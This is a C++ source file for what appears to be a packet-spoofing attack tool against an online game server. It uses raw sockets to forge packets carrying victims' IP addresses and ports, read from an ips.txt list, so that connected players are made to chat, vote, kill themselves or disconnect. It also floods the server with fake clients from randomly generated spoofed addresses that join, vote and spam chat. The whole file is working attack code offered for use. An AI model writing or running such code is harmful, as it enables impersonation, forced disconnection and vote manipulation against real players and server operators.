#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <string>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "api.h"
#include "client.h"
#include "core.h"
#include "networking.h"


unsigned char buffer[BUFLEN];

void Client::Packetgen::SendChat(unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort, const char *msg)
{
	if (!CreateSocket(GetClient()))
		CloseSocket(GetClient());

	char aMsg[256];
	sprintf_s(aMsg, sizeof(aMsg), "%s", msg);
	
	Reset(GetClient());
	memset(buffer, 0, BUFLEN);
	
	int bufferSize = PackSay(GetClient(), &buffer[0], aMsg, 0);
	SendData(GetClient(), srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void Client::Packetgen::SendKill(unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort)
{
	if (!CreateSocket(GetClient()))
		CloseSocket(GetClient());

	Reset(GetClient());
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackKill(GetClient(), &buffer[0]);
	SendData(GetClient(), srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void Client::Packetgen::SendDisconnect(unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort)
{
	if (!CreateSocket(GetClient()))
		CloseSocket(GetClient());

	Reset(GetClient());
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackDisconnect(GetClient(), &buffer[0]);
	SendData(GetClient(), srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void Client::Packetgen::SendVote(unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort, int v)
{
	if (!CreateSocket(GetClient()))
		CloseSocket(GetClient());

	Reset(GetClient());
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackVote(GetClient(), &buffer[0], v);
	SendData(GetClient(), srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void Client::Packetgen::SendConnectDummies(unsigned int dstIp, unsigned short dstPort, int amount, int vote, const char *chat)
{
	for (int i = 0; i < amount; i++) //generate random ips
		ipDummies[i] = inet_addr(GenerateIP());

	for (int i = 0; i < amount;i++) //generate sockets
		if (!CreateSocket_d(GetClient(), i))
			CloseSocket_d(GetClient(), i);

	connectedDummies = amount;

	ipDummiesSrv = dstIp;
	portDummiesSrv = dstPort;

	unsigned short srcPort = htons(DUMMIES_PORT);

	int bufferSize = 0;

	for (int i = 0; i < amount; i++)
	{
		Reset_d(GetClient(), i);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackConnect_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackClientInfo_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackReady_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackSendInfo_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackEnterGame_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		// one alive packet right after joining...
		memset(buffer, 0, BUFLEN);
		bufferSize = PackKeepAlive_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
		
		// vote if wanted
		if(vote != 0)
		{
			memset(buffer, 0, BUFLEN);
			bufferSize = PackVote_d(GetClient(), i, &buffer[0], vote);
			SendData(GetClient(), i, ipDummies[i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
		}

		// chat if wanted
		if(chat != 0)
		{
			memset(buffer, 0, BUFLEN);
			bufferSize = PackSay_d(GetClient(), i, &buffer[0], const_cast<char*>(chat), 0);
			SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
		}
	}
}

void Client::Packetgen::SendDisconnectDummies(const char *chat)
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies; i++)
	{
		if(chat)
		{
			memset(buffer, 0, BUFLEN);
			bufferSize = PackSay_d(GetClient(), i, &buffer[0], const_cast<char*>(chat), 0);
			SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
		}

		memset(buffer, 0, BUFLEN);
		bufferSize = PackDisconnect_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
	}
	connectedDummies = 0;
}

void Client::Packetgen::SendChatDummies(const char *msg)
{
	int bufferSize = 0;
	char aMsg[256];
	sprintf_s(aMsg, sizeof(aMsg), "%s", msg);

	for (int i = 0; i < connectedDummies; i++)
	{
		if (!CreateSocket_d(GetClient(), i))
			CloseSocket_d(GetClient(), i);

		Reset_d(GetClient(), i);
		memset(buffer, 0, BUFLEN);

		bufferSize = PackSay(GetClient(), &buffer[0], aMsg, 0);
		SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
	}
}

void Client::Packetgen::SendKeepAliveDummies()
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies; i++)
	{
		memset(buffer, 0, BUFLEN);
		bufferSize = PackKeepAlive_d(GetClient(), i, &buffer[0]);
		SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
	}
}

void Client::Packetgen::SendEmoteDummies(int emoticon)
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies; i++)
	{
		memset(buffer, 0, BUFLEN);
		bufferSize = PackEmoticon_d(GetClient(), i, &buffer[0], emoticon);
		SendData(GetClient(), i, ipDummies[i], htons(DUMMIES_PORT), ipDummiesSrv, portDummiesSrv, (const char*)buffer, bufferSize);
	}
}

void Client::Packetgen::SendListIpAll(unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendChat(inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, Line.c_str());
	}
}

void Client::Packetgen::SendVoteAll(unsigned int dstIp, unsigned short dstPort, int vote)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendVote(inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, vote);
	}
}

void Client::Packetgen::SendChatAll(unsigned int dstIp, unsigned short dstPort, const char *msg)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendChat(inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, msg);
	}
}

void Client::Packetgen::SendKillAll(unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendKill(inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort);
	}
}

void Client::Packetgen::SendDisconnectAll(unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendDisconnect(inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort);
	}
}
